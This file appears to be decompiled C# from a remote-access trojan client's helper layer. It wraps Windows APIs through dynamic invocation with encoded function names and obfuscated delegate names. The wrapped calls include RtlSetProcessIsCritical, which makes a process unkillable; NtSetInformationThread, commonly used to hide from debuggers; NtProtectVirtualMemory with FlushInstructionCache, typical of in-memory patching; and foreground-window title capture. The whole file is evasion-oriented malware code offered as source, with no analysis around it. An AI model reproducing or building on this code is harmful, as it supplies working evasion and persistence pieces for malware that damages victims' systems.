using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Client.Helper;

public static class DllImport
{
	public enum EXECUTION_STATE : uint
	{
		ES_CONTINUOUS = 2147483648u,
		ES_DISPLAY_REQUIRED = 2u,
		ES_SYSTEM_REQUIRED = 1u
	}

	public static int GetModuleHandleA(string lpModuleName)
	{
		object[] Parameters = new object[1] { lpModuleName };
		return ((IntPtr)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("kernel32.dll"), EncryptString.Decode("GetModuleHandleA"), typeof(Delegates.DSBnjin8bs92nbjfsdi), ref Parameters)).ToInt32();
	}

	public static EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags)
	{
		object[] Parameters = new object[1] { esFlags };
		return (EXECUTION_STATE)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("kernel32.dll"), EncryptString.Decode("SetThreadExecutionState"), typeof(Delegates.dsGFGdg), ref Parameters);
	}

	public static IntPtr GetForegroundWindow()
	{
		object[] Parameters = new object[0];
		return (IntPtr)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("user32.dll"), EncryptString.Decode("GetForegroundWindow"), typeof(Delegates.dsUinnb8sdn9g8bngs), ref Parameters);
	}

	public static int GetWindowText(IntPtr hWnd, StringBuilder text, int count)
	{
		object[] Parameters = new object[3] { hWnd, text, count };
		return (int)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("user32.dll"), EncryptString.Decode("GetWindowTextA"), typeof(Delegates.buhsdINJOMF9nuijm), ref Parameters);
	}

	public static bool GetDiskFreeSpaceEx(string lpDirectoryName, ref long lpFreeBytesAvailable, ref long lpTotalNumberOfBytes, ref long lpTotalNumberOfFreeBytes)
	{
		object[] Parameters = new object[4] { lpDirectoryName, lpFreeBytesAvailable, lpTotalNumberOfBytes, lpTotalNumberOfFreeBytes };
		bool result = (bool)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("kernel32.dll"), EncryptString.Decode("GetDiskFreeSpaceEx"), typeof(Delegates.gvSUDINJons29fg), ref Parameters);
		lpFreeBytesAvailable = (long)Parameters[1];
		lpTotalNumberOfBytes = (long)Parameters[2];
		lpTotalNumberOfFreeBytes = (long)Parameters[3];
		return result;
	}

	public static void RtlSetProcessIsCritical(uint v1, uint v2, uint v3)
	{
		object[] Parameters = new object[3] { v1, v2, v3 };
		DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("ntdll.dll"), EncryptString.Decode("RtlSetProcessIsCritical"), typeof(Delegates.dsRtlSetProcessIsCritical), ref Parameters);
	}

	public static uint NtSetInformationThread(IntPtr threadHandle, int threadInformationClass, IntPtr threadInformation, uint threadInformationLength)
	{
		object[] Parameters = new object[4] { threadHandle, threadInformationClass, threadInformation, threadInformationLength };
		return (uint)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("ntdll.dll"), EncryptString.Decode("NtSetInformationThread"), typeof(Delegates.dsNtSetInformationThread), ref Parameters);
	}

	public static IntPtr GetCurrentThread()
	{
		return (IntPtr)(-2);
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string path, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath, int shortPathLength);

	public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect)
	{
		OldProtect = 0u;
		object[] Parameters = new object[5] { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };
		bool result = (uint)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("ntdll.dll"), EncryptString.Decode("NtProtectVirtualMemory"), typeof(Delegates.gdfudsin8shd2), ref Parameters) == 0;
		BaseAddress = (IntPtr)Parameters[1];
		RegionSize = (IntPtr)Parameters[2];
		OldProtect = (uint)Parameters[4];
		return result;
	}

	public static bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize)
	{
		object[] Parameters = new object[3] { hProcess, lpBaseAddress, dwSize };
		return (bool)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("kernel32.dll"), EncryptString.Decode("FlushInstructionCache"), typeof(Delegates.dsFlushInstructionCache), ref Parameters);
	}
}
